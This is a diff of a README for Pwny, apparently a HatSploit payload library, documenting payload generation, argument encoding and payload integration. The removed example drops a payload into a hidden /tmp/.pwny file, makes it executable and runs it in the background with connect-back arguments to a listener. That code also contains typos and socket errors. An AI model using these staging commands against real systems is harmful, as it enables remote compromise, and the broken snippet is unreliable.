@@ -33,7 +33,10 @@ from pwny import Pwny
 from pwny import PwnySession
 ```
 
-To build payload, you should call `pwny.get_payload()`.
+* `Pwny` - Pwny utilities, mostly for generating payloads and encoding arguments.
+* `PwnySession` - Wrapper for `HatSploitSession` for Pwny, HatSploit should use it with Pwny payload.
+
+To build payload, you should call `get_payload()`.
 
 ```python3
 from pwny import Pwny
@@ -42,44 +45,28 @@ pwny = Pwny()
 payload = pwny.get_payload('linux', 'x64')
 ```
 
-Full example of how Pwny can be used out of HatSploit.
+To encode Pwny command line arguments use `encode_args()`.
 
 ```python3
-import socket
-
 from pwny import Pwny
-from pwny.session import PwnySession
-
-CONNBACK_HOST = '192.168.1.95'
-CONNBACK_PORT = '8888'
 
 pwny = Pwny()
+args = pwny.encode_args('192.168.1.1', 8888)
+```
 
-session = PwnySession()
-session.details['Platform'] = 'linux'
+## Adding Pwny payload
 
-payload = pwny.get_payload('linux', 'x64')
-args = pwny.encode_args(CONNBACK_HOST, CONNBACK_PORT)
+To add Pwny payload to HatSploit you should follow these steps.
 
-instructions = (
-    "cat >/tmp/.pwny;"
-    "chmod 777 /tmp/.pwny;"
-    f"sh -c '/tmp/.pwny {args} &'"
-)
+* Write a basic HatSploit payload template.
+* Import `Pwny` and `PwnySession` and put `Pwny` to `HatSploitPayload` class.
+* Set payload parameter `Session` to `PwnySession`.
+* Encode payload options with `encode_args()` and put them to `Args` payload parameter.
+* Return `get_payload()` as a payload return value.
 
-socket = socket()
-socket.bind(('0.0.0.0', 8888))
-socket.listen(1)
+In `get_payload()` you should put your payload platform and architecture.
 
-client, address = socket.accept()
-
-client.send(instructions.encode())
-cleint.send(payload)
-
-socket = socket()
-socket.bind(('0.0.0.0', 8888))
-socket.listen(1)
-
-session.open(client)
-session.interact()
+```python3
+return get_payload(self.details['Platform'],
+                   self.details['Architecture'])
 ```
